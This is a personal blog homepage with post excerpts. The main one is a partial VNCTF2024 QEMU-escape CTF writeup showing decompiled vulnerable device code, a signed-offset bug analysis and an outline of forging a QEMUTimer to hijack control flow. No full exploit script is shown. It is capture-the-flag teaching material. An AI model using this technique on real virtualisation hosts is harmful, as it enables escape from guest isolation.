<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_io/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon_io/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon_io/favicon-16x16.png">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://google-fonts.mirrors.sjtug.sjtu.edu.cn/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.cameudis.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Cameudis&#39;s Homepage">
<meta property="og:url" content="https://www.cameudis.com/index.html">
<meta property="og:site_name" content="Cameudis&#39;s Homepage">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Cameudis">
<meta property="article:tag" content="blog">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://www.cameudis.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Cameudis's Homepage</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Cameudis's Homepage</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Exp10re the W0r1d</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-notes">

    <a href="/notes/" rel="section"><i class="fa fa-sticky-note fa-fw"></i>notes</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Music/20db37a1b726.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis's Homepage">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
              <span class="post-sticky-flag" title="Sticky">
                <i class="fa fa-thumbtack"></i>
              </span>
            <a href="/Music/20db37a1b726.html" class="post-title-link" itemprop="url">【Music】私のBAND</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-03-15 21:52:47" itemprop="dateCreated datePublished" datetime="2024-03-15T21:52:47+08:00">2024-03-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-07-23 16:24:24" itemprop="dateModified" datetime="2024-07-23T16:24:24+08:00">2024-07-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Music/" itemprop="url" rel="index"><span itemprop="name">Music</span></a>
                </span>
            </span>

          
            <span id="/Music/20db37a1b726.html" class="post-meta-item leancloud_visitors" data-flag-title="【Music】私のBAND" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Music/20db37a1b726.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Music/20db37a1b726.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>「私のBAND」页面，收集我与乐队的演出视频。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/Music/20db37a1b726.html#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/PWN/576345e2f0f6.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis's Homepage">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/PWN/576345e2f0f6.html" class="post-title-link" itemprop="url">【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-04-18 13:22:03" itemprop="dateCreated datePublished" datetime="2024-04-18T13:22:03+08:00">2024-04-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-07-23 17:10:34" itemprop="dateModified" datetime="2024-07-23T17:10:34+08:00">2024-07-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
            </span>

          
            <span id="/Tech/PWN/576345e2f0f6.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/PWN/576345e2f0f6.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/PWN/576345e2f0f6.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>参考以及题目附件见：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-279588.htm">Black Hat 2023 0解Pwn题Houseofminho详细WP - Csome</a><br>本篇 Writeup 基于参考文章，但对攻击脚本作了一些优化（去除了一些意义不明的代码），并着重于把攻击思路理清楚（原文的思路太跳跃了，并且有一些地方和我的见解不太一样）。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/Tech/PWN/576345e2f0f6.html#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Daily/df1454eccbba.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis's Homepage">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Daily/df1454eccbba.html" class="post-title-link" itemprop="url">博客更新计划</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-04-17 15:05:32 / Modified: 15:10:31" itemprop="dateCreated datePublished" datetime="2024-04-17T15:05:32+08:00">2024-04-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Daily/" itemprop="url" rel="index"><span itemprop="name">Daily</span></a>
                </span>
            </span>

          
            <span id="/Daily/df1454eccbba.html" class="post-meta-item leancloud_visitors" data-flag-title="博客更新计划" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Daily/df1454eccbba.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Daily/df1454eccbba.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>我总是觉得基于hexo的博客更新起来并不是很方便，所以仿照某位同学又搭了一个新的站点，用来存放我的笔记。入口就在顶部的导航栏里，叫做<code>Notes</code>。</p>
<p>以后博客站点就用来放一些文章、杂记、随笔之类的东西了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/ef52a967d04d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis's Homepage">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/ef52a967d04d.html" class="post-title-link" itemprop="url">【Pwn#0x16】VNCTF2024 escape_langlang_mountain2 writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-02-18 21:23:25" itemprop="dateCreated datePublished" datetime="2024-02-18T21:23:25+08:00">2024-02-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-04-17 14:40:17" itemprop="dateModified" datetime="2024-04-17T14:40:17+08:00">2024-04-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/ef52a967d04d.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x16】VNCTF2024 escape_langlang_mountain2 writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/ef52a967d04d.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/ef52a967d04d.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>第一次从qemu里面逃出来，但没有完全逃出来，远程没通比赛就结束了S.H.I.T</p>
<p>题目链接：<a target="_blank" rel="noopener" href="https://github.com/xtxtn/vnctf2024-escape_langlang_mountain2wp">xtxtn&#x2F;vnctf2024-escape_langlang_mountain2wp (github.com)</a></p>
<p>关于qemu pwn入门，网上中文资料非常多：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/virtualization/qemu/basic-knowledge/dev/">QEMU - CTFwiki</a></li>
<li><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">QEMU 逃逸 潦草笔记 - xuanxuanblingbling</a></li>
<li><a target="_blank" rel="noopener" href="https://arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/">QEMU 简易食用指南 - Arttnba3</a></li>
<li><a target="_blank" rel="noopener" href="https://l0tus.vip/cn/qemu_escape/">虚拟机逃逸初探 - l0tus</a> l0tus师傅什么时候更新啊！！</li>
</ul>
<h2 id="环境与调试"><a href="#环境与调试" class="headerlink" title="环境与调试"></a>环境与调试</h2><p>理想的环境是 qemu 内的系统有 ssh，这样就可以直接连上去，甚至使用 scp 传 payload，但是这题没有。<br>我采用的调试方法是在 Dockerfile 中加一个 gdb，这样就可以在 docker 中调试，但是最佳的调试方法应该是往 docker 里面塞一个 gdbserver，然后用主机的 gdb attach 上去，这样就可以使用主机里的插件。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>题目实现设备提供了 <code>vn_mmio_read</code> 和 <code>vn_mmio_write</code> 两个函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vn_mmio_read</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = (__int64)object_dynamic_cast_assert(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">21u</span>, <span class="string">&quot;vn_mmio_read&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(v4 + <span class="number">0xB80</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(*(<span class="type">int</span> *)(v4 + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL + v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>object+0xb80</code> 用来保存一个偏移，该函数可以根据缓冲区的相对偏移读数据。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">vn_mmio_write</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, <span class="type">unsigned</span> __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = (__int64)object_dynamic_cast_assert(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">42u</span>, <span class="string">&quot;vn_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">48</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(v5 + <span class="number">0xB84</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v5 + *(<span class="type">int</span> *)(v5 + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL) = a3;<span class="comment">// 一次int范围内任意写</span></span><br><span class="line">      *(_DWORD *)(v5 + <span class="number">0xB84</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)a3 &lt;= <span class="number">60</span> )</span><br><span class="line">        *(_DWORD *)(v5 + <span class="number">0xB80</span>) = a3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">32</span> &amp;&amp; HIDWORD(a3) &lt;= <span class="number">0x3C</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v5 + HIDWORD(a3) + <span class="number">0xB40</span>) = a3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>write 中提供了三个功能：</p>
<ul>
<li>addr==16：设置 0xB80 处的偏移变量</li>
<li>addr==32：正常的 Buffer 内读写（0x40 大小空间，没有越界）</li>
<li>addr==48：根据偏移变量写入数据（仅限一次）</li>
</ul>
<p>在检查偏移变量的大小时，由于检查类型是 signed，因此可以把偏移修改为一个负数。于是我们就可以有无限次的任意相对地址读，以及一次任意相对地址写入。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>整体思路：</p>
<ol>
<li>在设备 Object 结构体内寻找堆地址和程序地址并泄露</li>
<li>从 main_loop_tlg 泄露出第二个 timerlist 的地址</li>
<li>在设备 Buffer 中伪造 QEMUTimer 结构体</li>
<li>劫持 timerlist 的 active_timers 指针为伪造的结构体</li>
</ol>
<h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>由于我第一次打 qemu pwn，对于其中各种结构体都比较陌生，所以我直接用本办法，在动态调试的时候查看 Buffer 前面的数据，从里面找到可以泄露的指针。（从而给后面本地打得通远程打不通埋下了伏笔）</p>
<p>在不清除结构体信息的情况下，找泄露的时候需要注意一些查找要点：</p>
<ul>
<li>泄露程序基地址时，随便找一个指向程序某地址的指针泄露就行了；</li>
<li>泄露堆地址时要注意，不同环境之间的堆环境可能不一样，因此在寻找时（假设我们想要泄露设备 Buffer 的地址）：<ul>
<li>最佳的泄露用指针是和 Buffer 处于同一个结构体中的指针</li>
<li>其次是和 Buffer 所在结构体位置相近的指针，越相近越好</li>
</ul>
</li>
<li><del>计算堆基址并没有什么用</del></li>
</ul>
<p>根据这种方法可以找到两个指针，然后泄露即可。</p>
<p>当然，如果你是一位对设备的 Object 结构体比较熟悉的 qemu pwn 大师，那么你就可以直接泄露结构体的某些字段来泄露程序和堆的地址。具体来说，可以通过 MemoryRegion 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    DeviceState *dev;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    MemoryRegion *container;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，<code>ops</code> 指向 data 段的 <code>vn_mmio_ops</code>，<code>opaque</code> 更是指向 vn 的设备结构体，因此泄露这两个指针就可以准确泄露地址，不用担心什么偏移不一样的问题。</p>
<h3 id="控制流劫持"><a href="#控制流劫持" class="headerlink" title="控制流劫持"></a>控制流劫持</h3><p>在网上可以找到的大部分 pwn 题中，设备本身就有一些函数指针，劫持它们就可以劫持控制流（甚至参数），但本题的设备就是单纯的读和写，并没有什么 <code>encode</code>、<code>rand</code> 之类的函数。因此，本题需要一个通用的控制流劫持方法。</p>
<p>在 Qemu 中，可以通过注册一个 QEMUTimer 来让 qemu 在一段时间间隔之后调用一个函数，参数为一个 opauqe 指针。相关结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="type">int</span> scale;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerList</span> &#123;</span></span><br><span class="line">    QEMUClock *clock;</span><br><span class="line">    QemuMutex active_timers_lock;</span><br><span class="line">    QEMUTimer *active_timers;</span><br><span class="line">    QLIST_ENTRY(QEMUTimerList) <span class="built_in">list</span>;</span><br><span class="line">    QEMUTimerListNotifyCB *notify_cb;</span><br><span class="line">    <span class="type">void</span> *notify_opaque;</span><br><span class="line">    QemuEvent timers_done_ev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>从内存视角看两个结构体长这样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    <span class="type">void</span> *timer_list;</span><br><span class="line">    <span class="type">void</span> *cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    <span class="type">void</span> *next;</span><br><span class="line">    <span class="type">int</span> scale;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerList</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * clock;</span><br><span class="line">    <span class="type">char</span> active_timers_lock[<span class="number">0x38</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> *<span class="title">active_timers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerList</span> *<span class="title">le_next</span>;</span>   <span class="comment">/* next element */</span>                      \</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerList</span> **<span class="title">le_prev</span>;</span>  <span class="comment">/* address of previous next element */</span>  \</span><br><span class="line">    <span class="type">void</span> *notify_cb;</span><br><span class="line">    <span class="type">void</span> *notify_opaque;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* lightweight method to mark the end of timerlist&#x27;s running */</span></span><br><span class="line">    <span class="type">size_t</span> timers_done_ev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

